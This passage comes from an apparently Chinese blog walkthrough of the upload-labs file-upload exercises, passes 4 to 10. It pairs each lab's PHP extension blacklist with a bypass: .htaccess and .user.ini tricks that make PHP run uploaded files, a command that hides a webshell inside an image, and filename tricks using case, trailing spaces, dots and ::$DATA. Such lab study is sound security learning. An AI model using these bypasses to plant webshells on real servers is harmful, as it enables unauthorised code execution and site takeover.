&quot;info&quot;&gt;#当前目录下，若匹配到名为info的文件，都会被解析为php代码</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><h3 id="bypass-3"><a href="#bypass-3" class="headerlink" title="bypass"></a>bypass</h3><p>上传<code>.htaccess</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;info&quot;&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>然后上传名为info，任意后缀名的一句话🐎即可</p><h2 id="pass5（黑名单-利用-user-ini本地包含）"><a href="#pass5（黑名单-利用-user-ini本地包含）" class="headerlink" title="pass5（黑名单-利用.user.ini本地包含）"></a>pass5（黑名单-利用.user.ini本地包含）</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>在第四关基础上.htaccess也被禁用了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时可以利用<code>.user.ini</code>文件</p><h4 id="user-ini-和-php-ini："><a href="#user-ini-和-php-ini：" class="headerlink" title=".user.ini 和 php.ini："></a>.user.ini 和 php.ini：</h4><h5 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h5><p><strong>php.ini</strong>是php的核心配置文件，在 PHP 启动时被读取。</p><p>​    <strong>但web目录的其他ini文件也可以被php识别</strong></p><h5 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h5><p><strong>.user.ini</strong>实际上就是一个可以由用户“自定义”的php.ini</p><p>而只有<code>PHP_INI_USER模式</code>、<code>PHP_INI_PERDIR模式（下表没有提到）</code>可以在 <strong>.user.ini</strong> 中设定</p><p><img src="https://i.loli.net/2021/02/13/3av5Zf6eGdDcwu9.png"><img src="https://i.loli.net/2021/02/13/RCYt9k2ZgGIfQzM.png"></p><p>在此我们可以利用<code>.user.ini</code>本地包含文件，从而实现对🐎的解析</p><h3 id="利用-user-ini本地包含文件"><a href="#利用-user-ini本地包含文件" class="headerlink" title="利用.user.ini本地包含文件"></a>利用<code>.user.ini</code>本地包含文件</h3><p>原理：利用.user.ini，使得目录下所有php文件自动包含某个文件~</p><p>条件：open_basedir没有被限制</p><p>（open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域）</p><p>函数：（不一定要php文件，毕竟是官方文档）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file：加载第一个php代码 前 先执行预加载该配置所指示的php文件，类似于在文件前调用了require()函数。</span><br><span class="line"></span><br><span class="line">auto_append_file：加载第一个php代码 后 先执行预加载该配置所指示的php文件。类似，只是在文件后面包含。</span><br></pre></td></tr></table></figure><p>利用：直接写在.user.ini中即可，test.jpg即为要包含的文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=test.jpg</span><br></pre></td></tr></table></figure><h3 id="bypass-4"><a href="#bypass-4" class="headerlink" title="bypass"></a>bypass</h3><p>1、准备<code>图片🐎</code></p><p>一个正常图片 1.jpg；一个包含🐎的1.php文件；合并后得到名为2.jpg的图片🐎</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cmd中：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/b指定以二进制格式复制、合并文件; 用于图像类/声音类文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash">/a指定以ASCII格式复制、合并文件。用于txt等文档类文件</span></span><br><span class="line">copy  1.jpg/b + 1.php/a  2.jpg</span><br></pre></td></tr></table></figure><p>或者直接十六进制打开图片，将一句话木马插入最底层</p><p><img src="https://i.loli.net/2021/02/13/uOTLmlvSxt8aeRr.png"></p><p>2、准备<code>.user.ini</code></p><p> 使用方法很简单，直接写在.user.ini中：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=ingo.jpg</span><br></pre></td></tr></table></figure><p><code>ingo.jpg</code>就是要包含的文件啦</p><p>3、找到目标服务器php可以正常访问的文件（应当与<code>.user.ini</code>在同一路径）</p><p>这里提示了readme.php</p><p><img src="https://i.loli.net/2021/02/13/IlYt2H8sr5Dg6Cv.png"></p><p>那么直接访问readme.php就可以了</p><p><img src="https://i.loli.net/2021/02/13/msP6WIU3ilG4yez.png"></p><h2 id="pass6（黑名单-大小写绕过）"><a href="#pass6（黑名单-大小写绕过）" class="headerlink" title="pass6（黑名单-大小写绕过）"></a>pass6（黑名单-大小写绕过）</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>如下，去掉了<code>strtolower($file_ext)</code>函数（转换为小写）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><h3 id="bypass-5"><a href="#bypass-5" class="headerlink" title="bypass"></a>bypass</h3><p>因此直接大小写绕过对后缀名做手脚：</p><p><img src="https://i.loli.net/2021/02/13/t6z3HOJNPckVU4b.png"></p><p>打开即可~</p><p>不过不知道之前apache配置错了一些啥–直接给我500了，明明以前还行QAQ</p><p>配置环境，苦不堪言</p><h2 id="pass7（黑名单-空格绕过）"><a href="#pass7（黑名单-空格绕过）" class="headerlink" title="pass7（黑名单-空格绕过）"></a>pass7（黑名单-空格绕过）</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>去掉了<code>trim($file_ext)</code>函数（首尾去空）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><h3 id="bypass-6"><a href="#bypass-6" class="headerlink" title="bypass"></a>bypass</h3><p>空格绕过：</p><p>原理：在windows中，会自动去掉文件后缀名末尾处的空格</p><p>抓包，直接在<code>.php</code>后加空格即可成功上传：<code>&quot;.php &quot;</code></p><p><img src="https://i.loli.net/2021/02/13/vgNeAFd2fKhQDxE.png"></p><h2 id="pass8（黑名单-“-”绕过）"><a href="#pass8（黑名单-“-”绕过）" class="headerlink" title="pass8（黑名单-“.”绕过）"></a>pass8（黑名单-“.”绕过）</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>去掉了<code>deldot($file_name)</code>(删除文件名末尾的点)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><h3 id="bypass-7"><a href="#bypass-7" class="headerlink" title="bypass"></a>bypass</h3><p>“.”绕过：</p><p>原理：windows中php会自动去除后缀名中最后的 “.” 的符号</p><p>同pass7，抓包在后缀名末尾加上<code>.</code>：<code>.php.</code></p><p><img src="https://i.loli.net/2021/02/13/CZIt5d8uW3e6rDT.png"></p><h2 id="pass9（黑名单-DATA绕过）"><a href="#pass9（黑名单-DATA绕过）" class="headerlink" title="pass9（黑名单-::$DATA绕过）"></a>pass9（黑名单-::$DATA绕过）</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>去掉了<code>str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext)</code>函数 (去除字符串::$DATA)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><h3 id="bypass-8"><a href="#bypass-8" class="headerlink" title="bypass"></a>bypass</h3><p>::$DATA绕过：</p><p>原理：利用了Windows下NTFS文件系统的一个特性，即NTFS文件系统存储数据流的一个属性DATA。<br>当访问test.php::$DATA时，实际是请求test.php本身的数据</p><p>又说：windows下，php，在文件名后面加上<code>::$DATA</code>系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p><p>还有一个说法是：Windows系统下，如果上传的文件名中test.php::$DATA会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析。</p><p>同7、8，抓包在后缀加上<code>::$DATA</code>即可：</p><p><img src="https://i.loli.net/2021/02/13/5fzWIStRhy3Xqkr.png"></p><p>访问路径的时候要注意去掉后缀<code>::$DATA</code>才能成功访问，否则找不到文件</p><p><img src="https://i.loli.net/2021/02/13/nZvWVDsTpyGKf2b.png"></p><h2 id="pass10（黑名单-代码审计）"><a href="#pass10（黑名单-代码审计）" class="headerlink" title="pass10（黑名单-代码审计）"></a>pass10（黑名单-代码审计）</h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>ps: 其他几题无非是都尝试一边，而这题在黑盒情况下属实不知该怎么做==</p><p>如下，可以看到对文件的上传路径进行了更改：拼接的是<code>$file_name</code>而不是<code>$file_ext</code>（pass5也是）</p><p>而在源码中$file_name的过滤措施只是简单的去掉文件名末尾的点，使用<code>&#39;. .&#39;</code>即可bypass（即<code>&#39;. .&#39;</code>经deldot()得到<code>&#39;. &#39;</code>）</p><pre><code>        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;        $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;    #原</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span 